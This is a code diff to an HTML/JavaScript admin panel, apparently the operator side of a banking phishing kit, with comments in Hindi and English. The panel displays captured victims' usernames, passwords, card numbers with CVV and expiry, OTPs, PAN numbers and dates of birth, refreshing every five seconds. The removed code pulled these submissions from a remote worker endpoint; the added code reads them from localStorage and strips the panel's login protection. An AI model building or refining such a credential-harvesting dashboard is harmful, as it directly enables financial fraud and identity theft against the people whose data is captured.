@@ -3,12 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LIVE ADMIN – WORKER SUBMISSIONS</title>
+    <title>j</title>
     <style>
+        /* === complete reset – same structure, only design tweaks as requested === */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
-        body { background-color: white; min-height: 100vh; padding: 0; }
-        
-        /* HEADER – tere design jaisa, bina logo ke */
+
+        body {
+            background-color: white;
+            min-height: 100vh;
+            padding: 0;
+        }
+
+        /* --- login overlay COMPLETELY REMOVED (password protect hatao) --- */
+        /* .main-content now always visible, no display:none */
+        .main-content {
+            display: block;   /* was none – now always shown */
+        }
+
+        /* ========== HEADER – same sticky, no logo, no logout ========== */
         .page-header {
             background-color: #f8f9fa;
             padding: 8px 15px;
@@ -19,172 +31,191 @@
             top: 0;
             z-index: 100;
         }
+        /* logo class exists but no image, and we keep display:none */
+        .logo {
+            display: none;
+        }
         .header-title {
             font-size: 16px;
             color: #333;
             font-weight: bold;
             margin-left: 0;
         }
-        
-        /* DATA CONTAINER – white/black combination */
-        .data-container { padding: 0; }
-        .data-item {
+
+        /* ---------- DATA CONTAINER – black & white combination, larger & bold text ---------- */
+        .data-container { 
+            padding: 0; 
+        }
+
+        .data-item { 
             padding: 12px 15px;
-            border-bottom: 1px solid #ddd;
+            border-bottom: 1px solid #ddd; 
             font-size: 15px;
             font-weight: 600;
             line-height: 1.5;
         }
-        .data-item.white-bg { background-color: white; color: #111; }
-        .data-item.black-bg { background-color: #0a0a0a; color: white; }
-        .data-item.black-bg .field-label { color: #ccc !important; }
+
+        .data-item.white-bg { 
+            background-color: white; 
+            color: #111;
+        }
+
+        /* skyblue replaced with deep black, white text */
+        .data-item.black-bg { 
+            background-color: #0a0a0a;
+            color: white; 
+        }
+        .data-item.black-bg .field-label {
+            color: #ccc !important;
+        }
         .data-item.black-bg span, 
-        .data-item.black-bg div { color: white; }
-        
-        .field {
-            margin-bottom: 4px;
+        .data-item.black-bg div {
+            color: white;
+        }
+
+        .field { 
+            margin-bottom: 4px; 
             display: flex;
             flex-wrap: wrap;
         }
-        .field-label {
+        .field-label { 
             font-weight: 700;
-            color: #444;
-            margin-right: 6px;
+            color: #444; 
+            margin-right: 6px; 
             min-width: 60px;
         }
-        
-        /* Category ke hisab se label colors (sirf white-bg pe) */
+
+        /* category specific – visible on white-bg, black-bg override above */
         .otp-data .field-label { color: #0a5c8c; }
         .pan-data .field-label { color: #1e5a1e; }
         .account-data .field-label { color: #5e2a7c; }
         
-        .black-bg .field-label { color: #e0e0e0 !important; }
-        
-        .empty {
-            text-align: center;
-            padding: 60px 20px;
-            color: #666;
-            font-size: 16px;
+        .black-bg .field-label { 
+            color: #e0e0e0 !important; 
+        }
+
+        .empty { 
+            text-align: center; 
+            padding: 60px 20px; 
+            color: #666; 
+            font-size: 16px; 
             font-weight: bold;
+        }
+
+        /* ------ blink styles still exist but NEVER USED (blink band) ------ */
+        .blink-flash {
+            background-color: #f2f2f2 !important;
+            transition: background-color 0.15s;
+        }
+        .black-bg.blink-flash {
+            background-color: #2a2a2a !important;
         }
     </style>
 </head>
 <body>
-    <div class="main-content">
+    <!-- 
+         LOGIN POPUP COMPLETELY REMOVED – as per "pasword protect hatao"
+        No overlay, no login form, no session.
+        Main content is directly visible.
+    -->
+    
+    <div class="main-content" id="mainContent">
         <header class="page-header">
-            <div class="header-title">⚡ LIVE ADMIN – WORKER KV (SUBMISSIONS)</div>
+            <!-- logo completely absent – only title -->
+            <div class="header-title"> LIVE DATA</div>
+            <!-- no logout button -->
         </header>
         
         <div class="data-container" id="dataContainer">
-            <div class="empty">⏳ Data load ho raha hai...</div>
+            <!-- filled by JavaScript -->
         </div>
     </div>
 
     <script>
-        // ---------- TERA WORKER API URL ----------
-        const WORKER_API_URL = 'https://aged-sunset-63e0.s3d38284.workers.dev/api/submissions';
+        // ---------- PASSWORD PROTECT HATAO – entire login/session code removed ----------
+        // Directly load data from localStorage, no credentials, no popup.
+        // Auto-refresh every 5 seconds, no blink effect.
+
         const container = document.getElementById('dataContainer');
 
-        // ---------- DATA LOAD KARO (Worker se fetch) ----------
-        async function loadData() {
-            try {
-                const response = await fetch(WORKER_API_URL);
-                if (!response.ok) throw new Error('Network error');
-                const submissions = await response.json();
-                displayData(submissions);
-            } catch (error) {
-                console.error('Fetch error:', error);
-                container.innerHTML = `<div class="empty">❌ Error: ${error.message}</div>`;
-            }
-        }
-
-        // ---------- DATA DIKHAO – TERI EXACT DESIGN ME ----------
-        function displayData(submissions) {
-            if (!submissions || submissions.length === 0) {
-                container.innerHTML = '<div class="empty">📭 Koi data nahi hai</div>';
+        // ---------- LOADDATA – same black/white combo, no blink ----------
+        function loadData() {
+            const data = JSON.parse(localStorage.getItem('formSubmissions') || '[]');
+            
+            if (data.length === 0) {
+                container.innerHTML = '<div class="empty">    </div>';
                 return;
             }
-
+            
             let html = '';
             let counter = 0;
-
-            submissions.forEach(item => {
+            
+            // reverse order: latest first
+            data.slice().reverse().forEach(item => {
                 let itemHtml = '';
+                // white-bg (even), black-bg (odd) – same combination
                 let bgClass = counter % 2 === 0 ? 'white-bg' : 'black-bg';
                 counter++;
-
-                // ---------- TYPE PEHCHANO ----------
-                let type = item.formType || '';
-                if (!type) {
-                    if (item.username) type = 'User ID';
-                    else if (item.cardNumber) type = 'Credit Card';
-                    else if (item.otp) type = 'OTP';
-                    else if (item.pan) type = 'PAN';
-                    else if (item.dob) type = 'Account Details';
-                    else if (item.name && !item.pan && !item.dob) type = 'User ID'; // fallback
-                }
-
-                // ---------- HAR TYPE KE HISAB SE HTML ----------
-                if (type === 'User ID' || item.username) {
+                
+                if (item.type === 'User ID') {
                     itemHtml = `
-                        <div class="field"><span class="field-label">User:</span>${item.username || item.data?.username || 'N/A'}</div>
-                        <div class="field"><span class="field-label">Pass:</span>${item.password || item.data?.password || 'N/A'}</div>
-                        <div class="field"><span class="field-label">Mobile:</span>${item.mobile || item.data?.mobile || 'N/A'}</div>
+                        <div class="field"><span class="field-label">User:</span>${item.data.username || 'N/A'}</div>
+                        <div class="field"><span class="field-label">Pass:</span>${item.data.password || 'N/A'}</div>
+                        <div class="field"><span class="field-label">Mobile:</span>${item.data.mobile || 'N/A'}</div>
                     `;
                     html += `<div class="data-item ${bgClass} user-data">${itemHtml}</div>`;
-                }
-                else if (type === 'Credit Card' || item.cardNumber) {
+                } 
+                else if (item.type === 'Credit Card') {
                     itemHtml = `
-                        <div class="field"><span class="field-label">Card:</span>${item.cardNumber || item.data?.cardNumber || 'N/A'}</div>
-                        <div class="field"><span class="field-label">Expiry:</span>${item.expiry || item.data?.expiry || 'N/A'}</div>
-                        <div class="field"><span class="field-label">CVV:</span>${item.cvv || item.data?.cvv || 'N/A'}</div>
-                        <div class="field"><span class="field-label">Limit:</span>${item.creditLimit || item.data?.creditLimit || 'N/A'}</div>
-                        <div class="field"><span class="field-label">Mobile:</span>${item.mobile || item.data?.mobile || 'N/A'}</div>
+                        <div class="field"><span class="field-label">Card:</span>${item.data.cardNumber || 'N/A'}</div>
+                        <div class="field"><span class="field-label">Expiry:</span>${item.data.expiry || 'N/A'}</div>
+                        <div class="field"><span class="field-label">CVV:</span>${item.data.cvv || 'N/A'}</div>
+                        <div class="field"><span class="field-label">Limit:</span>${item.data.creditLimit || 'N/A'}</div>
+                        <div class="field"><span class="field-label">Mobile:</span>${item.data.mobile || 'N/A'}</div>
                     `;
                     html += `<div class="data-item ${bgClass} card-data">${itemHtml}</div>`;
-                }
-                else if (type === 'OTP' || type === 'OTP2' || item.otp) {
+                } 
+                else if (item.type === 'OTP' || item.type === 'OTP2') {
                     itemHtml = `
                         <div class="field"><span class="field-label">OTP:</span>${item.otp || 'N/A'}</div>
                     `;
                     html += `<div class="data-item ${bgClass} otp-data">${itemHtml}</div>`;
-                }
-                else if (type === 'PAN' || item.pan) {
+                } 
+                else if (item.type === 'PAN') {
                     itemHtml = `
-                        <div class="field"><span class="field-label">Name:</span>${item.name || item.data?.name || 'N/A'}</div>
-                        <div class="field"><span class="field-label">PAN:</span>${item.pan || item.data?.pan || 'N/A'}</div>
+                        <div class="field"><span class="field-label">Name:</span>${item.data.name || 'N/A'}</div>
+                        <div class="field"><span class="field-label">PAN:</span>${item.data.pan || 'N/A'}</div>
                     `;
                     html += `<div class="data-item ${bgClass} pan-data">${itemHtml}</div>`;
-                }
-                else if (type === 'Account Details' || item.dob) {
+                } 
+                else if (item.type === 'Account Details') {
                     itemHtml = `
-                        <div class="field"><span class="field-label">Name:</span>${item.name || item.data?.name || 'N/A'}</div>
-                        <div class="field"><span class="field-label">DOB:</span>${item.dob || item.data?.dob || 'N/A'}</div>
+                        <div class="field"><span class="field-label">Name:</span>${item.data.name || 'N/A'}</div>
+                        <div class="field"><span class="field-label">DOB:</span>${item.data.dob || 'N/A'}</div>
                     `;
                     html += `<div class="data-item ${bgClass} account-data">${itemHtml}</div>`;
                 }
                 else {
-                    // Fallback – kuch aur type
-                    itemHtml = `<div class="field"><span class="field-label">Type:</span>${type || 'Unknown'}</div>`;
-                    // Kuch fields dikhane ki koshish
-                    for (let key in item) {
-                        if (['key', 'timestamp', 'formType', 'data'].includes(key)) continue;
-                        if (typeof item[key] === 'string' && !key.includes('timestamp')) {
-                            itemHtml += `<div class="field"><span class="field-label">${key}:</span>${item[key]}</div>`;
-                        }
-                    }
+                    itemHtml = `
+                        <div class="field"><span class="field-label">Type:</span>${item.type || 'Unknown'}</div>
+                        <div class="field"><span class="field-label">Data:</span>${JSON.stringify(item) || 'N/A'}</div>
+                    `;
                     html += `<div class="data-item ${bgClass}">${itemHtml}</div>`;
                 }
             });
-
+            
             container.innerHTML = html;
+
+            // ********** BLINK BAND KARO – entire flash animation removed **********
+            // (previous code that added/removed 'blink-flash' class is deleted)
         }
 
-        // ---------- PAGE LOAD + AUTO REFRESH (5 sec) ----------
-        window.addEventListener('load', function() {
-            loadData();
-            setInterval(loadData, 5000); // Bin blink ke, bas refresh
-        });
+        // --- DIRECT LOAD on page start ---
+        loadData();
+
+        // --- AUTO REFRESH – exactly 5 seconds, no blink, no login ---
+        if (window.refreshInterval) clearInterval(window.refreshInterval);
+        window.refreshInterval = setInterval(loadData, 5000);
     </script>
 </body>
 </html>
